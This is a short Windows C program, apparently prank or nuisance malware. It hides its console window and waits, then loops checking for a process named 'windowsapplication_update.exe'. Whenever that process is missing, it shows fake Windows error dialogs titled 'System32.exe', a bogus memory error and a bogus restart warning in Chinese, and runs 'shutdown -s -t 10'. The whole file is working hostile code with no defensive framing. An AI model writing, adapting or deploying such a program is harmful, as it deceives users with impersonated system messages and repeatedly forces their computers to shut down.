#include <windows.h>
#include <tlhelp32.h>	
#include <stdio.h>
#pragma comment(lib,"user32")
#include<conio.h>
#include<string.h>
#include<stdlib.h> 
 
bool getProcess(const char *procressName)				
{
	char pName[MAX_PATH];								
	strcpy(pName,procressName);							
	CharLowerBuff(pName,MAX_PATH);					
	PROCESSENTRY32 currentProcess;						
	currentProcess.dwSize = sizeof(currentProcess);		
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
 
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot()调用失败!\n");
		return false;
	}
 
	bool bMore=Process32First(hProcess,&currentProcess);	
	while(bMore)
	{
		CharLowerBuff(currentProcess.szExeFile,MAX_PATH);	
		if (strcmp(currentProcess.szExeFile,pName)==0)		
		{
			CloseHandle(hProcess);							
			return true;
		}
		bMore=Process32Next(hProcess,&currentProcess);	
	}
 
	CloseHandle(hProcess);	
	return false;
}
 
int main(int argc,char *argv[])
{
	ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0); 
	Sleep(15000);
	int cycle=0;
	for(cycle=0;;cycle=cycle+1)
	{ 
	if (getProcess("windowsapplication_update.exe"))
	{
		printf(" ");
	}
	else
	{
		MessageBox(NULL,"Error:0x00b133b指令引用的0x00b133b内存，该内存不能为'read'!","System32.exe",MB_OKCANCEL|MB_SETFOREGROUND);
		Sleep(3000);
		MessageBox(NULL,"Error:检测到系统发生未知错误，将于10秒后重启！","System32.exe",MB_OKCANCEL|MB_SETFOREGROUND);
		system("shutdown -s -t 10");
	}
	Sleep(5000);
    }
    system("pasue");
	return 0;
}
